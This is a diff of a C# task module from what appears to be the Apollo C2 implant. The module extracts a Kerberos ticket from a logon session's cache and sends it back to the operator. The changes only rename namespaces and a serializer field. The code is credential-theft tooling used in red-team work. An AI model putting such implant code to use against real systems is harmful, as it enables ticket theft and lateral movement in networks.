@@ -9,11 +9,11 @@
 using System;
 using System.Collections.Generic;
 using System.Runtime.Serialization;
-using PhantomInterop.Classes;
-using PhantomInterop.Features.KerberosTickets;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
-using PhantomInterop.Utils;
+using ApolloInterop.Classes;
+using ApolloInterop.Features.KerberosTickets;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
+using ApolloInterop.Utils;
 
 namespace Tasks;
 
@@ -35,7 +35,7 @@ public class ticket_cache_extract : Tasking
     public override void Start()
     {
         MythicTaskResponse resp = new MythicTaskResponse { };
-        TicketExtractParameters parameters = _dataSerializer.Deserialize<TicketExtractParameters>(_data.Parameters);
+        TicketExtractParameters parameters = _jsonSerializer.Deserialize<TicketExtractParameters>(_data.Parameters);
         string luid = parameters.luid ?? "";
         string service = parameters.service;
         try
@@ -43,7 +43,7 @@ public class ticket_cache_extract : Tasking
             var (ticket, errorMsg) = _agent.GetTicketManager().ExtractTicketFromCache(luid, service);
             if (ticket != null)
             {
-                resp = CreateTaskResponse(_dataSerializer.Serialize(new KerberosTicketStoreDTO(ticket)), true);
+                resp = CreateTaskResponse(_jsonSerializer.Serialize(new KerberosTicketStoreDTO(ticket)), true);
             } else
             {
                 resp = CreateTaskResponse(errorMsg, true, "error");
@@ -54,7 +54,7 @@ public class ticket_cache_extract : Tasking
         {
             resp = CreateTaskResponse($"Failed to enumerate tickets: {e.Message}", true, "error");
         }
-        
+        //get and send back any artifacts
         IEnumerable<Artifact> artifacts = _agent.GetTicketManager().GetArtifacts();
         var artifactResp = CreateArtifactTaskResponse(artifacts);
         _agent.GetTaskManager().AddTaskResponseToQueue(artifactResp);
